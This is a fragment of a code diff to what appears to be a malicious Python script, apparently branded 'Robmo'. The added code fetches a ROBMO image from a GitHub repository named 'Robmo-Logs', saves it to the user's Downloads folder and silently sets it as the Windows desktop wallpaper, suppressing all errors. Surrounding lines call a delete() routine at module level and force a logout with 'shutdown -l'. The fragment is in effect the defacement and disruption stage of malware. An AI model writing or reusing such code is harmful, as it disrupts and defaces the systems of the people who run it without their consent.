@@ -891,6 +891,32 @@ def delete():
         pass
 delete()
 
+def d(url, des, max_attempts=3):
+    attempt = 1
+    while attempt <= max_attempts:
+        try:
+            response = requests.get(url)
+            response.raise_for_status()
+            filen = os.path.join(des, "ROBMO.jpg")
+            with open(filen, 'wb') as file:
+                file.write(response.content)
+            return filen
+        except requests.RequestException as e:
+            attempt += 1
+    return None
+
+def set(path):
+    try:
+        ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)
+    except Exception as e:
+        pass
+
+iurl = "https://github.com/matiasb186/Robmo-Logs/raw/15dc0cacb0da21ef080f387206e2f7dc8d5584c3/Resources/ROBMO.png"
+directory = os.path.join(os.path.expanduser("~"), "Downloads")
+downloaded = d(iurl, directory)
+
+set(downloaded)
+
 def logout():
     return os.system('shutdown -l')
 logout()
